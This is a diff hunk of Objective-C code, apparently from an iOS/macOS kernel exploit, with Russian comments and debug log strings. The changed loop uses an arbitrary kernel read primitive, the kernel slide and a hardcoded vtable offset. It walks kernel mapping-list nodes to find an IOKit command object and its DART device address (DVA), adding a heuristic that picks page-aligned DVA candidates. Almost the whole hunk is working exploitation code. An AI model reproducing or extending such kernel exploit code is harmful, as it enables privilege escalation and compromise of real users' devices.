@@ -6693,35 +6693,39 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         kpNote(r, [NSString stringWithFormat:@"  [P2] mapping-список: head=%#llx count=%u",
                   (unsigned long long)node, ncount]);
         for (uint32_t ni = 0; ni < 32 && kpLooksLikeKernelPointer(node) && kpSafeToRead(node) && !cmdVA; ni++) {
-            if ((uint32_t)(node & 0x3fff) + 0x80 > 0x4000) break;
-            uint64_t cmdC = 0;
-            for (uint32_t o = 0; o + 8 <= 0x80; o += 8) {
-                uint64_t P = kp_untag_ptr(early_kread64(node + o));
-                if (!kpLooksLikeKernelPointer(P) || !kpSafeToRead(P)) continue;
-                uint64_t pvt = kp_untag_ptr(early_kread64(P));
-                if ((uint32_t)(pvt ? pvt - kslide2 : 0) == 0x7afa9e8) { cmdC = P; break; }
-            }
-            if (cmdC) {
-                uint64_t mObj = kp_untag_ptr(early_kread64(cmdC + 0x70));
-                uint64_t dv2 = 0, ln2 = 0;
-                if (kpLooksLikeKernelPointer(mObj) && kpSafeToRead(mObj)) {
-                    dv2 = early_kread64(mObj + 0xa0);
-                    ln2 = early_kread64(mObj + 0xa8);
+            if ((uint32_t)(node & 0x3fff) + 0xa0 > 0x4000) break;
+            // 1.9.185: дамп всех qwords ноды (0xA0): ищем cmd (vt 0x7afa9e8) и
+            // DVA-кандидаты (page-aligned, < 4TB DART-space). У head-ноды на
+            // +0x18 лежало 0x10122000000 — пробуем через walk (PTE-маска решит).
+            for (uint32_t o = 0; o + 8 <= 0xa0; o += 8) {
+                uint64_t q = early_kread64(node + o);
+                uint64_t u = kp_untag_ptr(q);
+                if (kpLooksLikeKernelPointer(u) && kpSafeToRead(u)) {
+                    uint64_t pvt = kp_untag_ptr(early_kread64(u));
+                    if ((uint32_t)(pvt ? pvt - kslide2 : 0) == 0x7afa9e8) {
+                        uint64_t mObj = kp_untag_ptr(early_kread64(u + 0x70));
+                        uint64_t dv2 = 0, ln2 = 0;
+                        if (kpLooksLikeKernelPointer(mObj) && kpSafeToRead(mObj)) {
+                            dv2 = early_kread64(mObj + 0xa0);
+                            ln2 = early_kread64(mObj + 0xa8);
+                        }
+                        kpNote(r, [NSString stringWithFormat:@"    нода[%u]+%#x → cmd=%#llx mapObj=%#llx DVA=%#llx len=%#llx%@",
+                                  ni, o, (unsigned long long)u, (unsigned long long)mObj,
+                                  (unsigned long long)dv2, (unsigned long long)ln2,
+                                  (dv2 && (ln2 == 0x1000 || ln2 == 0x4000)) ? @" ← НАШ ✓" : @""]);
+                        if (dv2 && (ln2 == 0x1000 || ln2 == 0x4000) && !cmdVA) { cmdVA = u; dva = dv2; dvaLen = ln2; }
+                    }
                 }
-                kpNote(r, [NSString stringWithFormat:@"  [P2] нода[%u]=%#llx cmd=%#llx mapObj=%#llx DVA=%#llx len=%#llx%@",
-                          ni, (unsigned long long)node, (unsigned long long)cmdC, (unsigned long long)mObj,
-                          (unsigned long long)dv2, (unsigned long long)ln2,
-                          (dv2 && (ln2 == 0x1000 || ln2 == 0x4000)) ? @" ← НАШ ✓" : @""]);
-                if (dv2 && (ln2 == 0x1000 || ln2 == 0x4000)) { cmdVA = cmdC; dva = dv2; dvaLen = ln2; }
-            } else {
-                uint64_t n0 = early_kread64(node), n8 = early_kread64(node + 8),
-                         n18 = kp_untag_ptr(early_kread64(node + 0x18)), n20 = kp_untag_ptr(early_kread64(node + 0x20));
-                kpNote(r, [NSString stringWithFormat:@"    нода[%u]=%#llx: +0=%#llx +8=%#llx +0x18=%#llx +0x20=%#llx",
-                          ni, (unsigned long long)node, (unsigned long long)n0, (unsigned long long)n8,
-                          (unsigned long long)n18, (unsigned long long)n20]);
+                // DVA-кандидат: page-aligned, < 4TB, ненулевой — прогоняем walk
+                if (q && !(q & 0x3fff) && q < 0x40000000000ULL && !dva) {
+                    kpNote(r, [NSString stringWithFormat:@"    нода[%u]+%#x: DVA-кандидат %#llx — пробуем", ni, o, (unsigned long long)q]);
+                    dva = q;
+                }
             }
+            if (cmdVA) break;
             uint64_t nx = kp_untag_ptr(early_kread64(node + 0x20));
-            if (!kpLooksLikeKernelPointer(nx) || nx == node) nx = kp_untag_ptr(early_kread64(node + 0x18));
+            if (!kpLooksLikeKernelPointer(nx) || nx == node) nx = kp_untag_ptr(early_kread64(node + 0x10));
+            if (!kpLooksLikeKernelPointer(nx) || nx == node) nx = kp_untag_ptr(early_kread64(node + 0x8));
             if (!kpLooksLikeKernelPointer(nx) || nx == node) break;
             node = nx;
         }
